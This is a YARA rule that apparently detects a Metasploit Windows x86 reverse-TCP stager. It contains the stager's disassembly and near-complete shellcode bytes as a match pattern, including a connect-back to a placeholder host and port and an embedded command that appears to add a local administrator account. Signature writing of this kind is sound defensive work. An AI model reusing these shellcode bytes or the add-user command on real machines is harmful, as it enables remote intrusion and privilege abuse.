
    rule stager_reverse_ord_tcp___start0___x86
    {
        meta:
            desc = "Metasploit::windows::x86::stager_reverse_ord_tcp::__start0__"
    
        /*
            FC                   | .                    | cld
            31DB                 | 1.                   | xor ebx,ebx
            648B4330             | d.C0                 | mov eax,[fs:ebx+0x30]
            8B400C               | .@.                  | mov eax,[eax+0xc]
            8B501C               | .P.                  | mov edx,[eax+0x1c]
            8B12                 | ..                   | mov edx,[edx]
            8B7220               | .r                   | mov esi,[edx+0x20]
            AD                   | .                    | lodsd
            AD                   | .                    | lodsd
            4E                   | N                    | dec esi
            0306                 | ..                   | add eax,[esi]
            3D32335F32           | =23_2                | cmp eax,0x325f3332
            0F85EBFFFFFF         | ......               | jnz 0xd
            8B6A08               | .j.                  | mov ebp,[edx+0x8]
            8B453C               | .E<                  | mov eax,[ebp+0x3c]
            8B4C0578             | .L.x                 | mov ecx,[ebp+eax+0x78]
            8B4C0D1C             | .L..                 | mov ecx,[ebp+ecx+0x1c]
            01E9                 | ..                   | add ecx,ebp
            8B4158               | .AX                  | mov eax,[ecx+0x58]
            01E8                 | ..                   | add eax,ebp
            8B713C               | .q<                  | mov esi,[ecx+0x3c]
            01EE                 | ..                   | add esi,ebp
            03690C               | .i.                  | add ebp,[ecx+0xc]
            53                   | S                    | push ebx
            6A01                 | j.                   | push byte +0x1
            6A02                 | j.                   | push byte +0x2
            FFD0                 | ..                   | call eax
            97                   | .                    | xchg eax,edi
            68????????           | h....                | push dword 0x100007f	; Host
            680200????           | h...\                | push dword 0x5c110002	; Port
            89E1                 | ..                   | mov ecx,esp
            53                   | S                    | push ebx
            B70C                 | ..                   | mov bh,0xc
            53                   | S                    | push ebx
            51                   | Q                    | push ecx
            57                   | W                    | push edi
            51                   | Q                    | push ecx
            6A10                 | j.                   | push byte +0x10
            51                   | Q                    | push ecx
            57                   | W                    | push edi
            56                   | V                    | push esi
            FFE5                 | ..                   | jmp ebp
            636D64               | cmd                  | arpl [ebp+0x64],bp
            650F885E000000       | e..^...              | gs js 0xc9
            202F                 |  /                   | and [edi],ch
            6320                 | c                    | arpl [eax],sp
            6E                   | n                    | outsb
            650F8415000000       | e......              | gs jz 0x8c
            0F8564000000         | ..d...               | jnz 0xe1
            650F820D000000       | e......              | gs jc 0x91
            6D                   | m                    | insd
            650F844A000000       | e..J...              | gs jz 0xd6
            0F8355000000         | ..U...               | jnc 0xe7
            6C                   | l                    | insb
            6F                   | o                    | outsd
            6970202F414444       | ip /ADD              | imul esi,[eax+0x20],dword 0x4444412f
            2026                 |  &                   | and [esi],ah
            26206E65             | & ne                 | and [es:esi+0x65],ch
            0F8402000000         | ......               | jz 0xa9
            6C                   | l                    | insb
            6F                   | o                    | outsd
            63616C               | cal                  | arpl [ecx+0x6c],sp
            670F824D000000       | g..M...              | a16 jc 0x100
            0F854A000000         | ..J...               | jnz 0x103
            204164               |  Ad                  | and [ecx+0x64],al
            6D                   | m                    | insd
            696E6973747261       | inistra              | imul ebp,[esi+0x69],dword 0x61727473
            0F8445000000         | ..E...               | jz 0x10f
            0F8245000000         | ..E...               | jc 0x115
            206D65               |  me                  | and [ebp+0x65],ch
            0F842F000000         | ../...               | jz 0x108
            0F833A000000         | ..:...               | jnc 0x119
            6C                   | l                    | insb
            6F                   | o                    | outsd
            69702F41444400       | ip/ADD.              | imul esi,[eax+0x2f],dword 0x444441
        */
    
        strings:
            $a   = { fc 31 db 64 8b 43 30 8b 40 0c 8b 50 1c 8b 12 8b 72 20 ad ad 4e 03 06 3d 32 33 5f 32 0f 85 eb ff ff ff 8b 6a 08 8b 45 3c 8b 4c 05 78 8b 4c 0d 1c 01 e9 8b 41 58 01 e8 8b 71 3c 01 ee 03 69 0c 53 6a 01 6a 02 ff d0 97 68 ?? ?? ?? ?? 68 02 00 ?? ?? 89 e1 53 b7 0c 53 51 57 51 6a 10 51 57 56 ff e5 63 6d 64 65 0f 88 5e 00 00 00 20 2f 63 20 6e 65 0f 84 15 00 00 00 0f 85 64 00 00 00 65 0f 82 0d 00 00 00 6d 65 0f 84 4a 00 00 00 0f 83 55 00 00 00 6c 6f 69 70 20 2f 41 44 44 20 26 26 20 6e 65 0f 84 02 00 00 00 6c 6f 63 61 6c 67 0f 82 4d 00 00 00 0f 85 4a 00 00 00 20 41 64 6d 69 6e 69 73 74 72 61 0f 84 45 00 00 00 0f 82 45 00 00 00 20 6d 65 0f 84 2f 00 00 00 0f 83 3a 00 00 00 6c 6f 69 70 2f 41 44 44 00 }
    
        condition:
            any of them
    }
    
    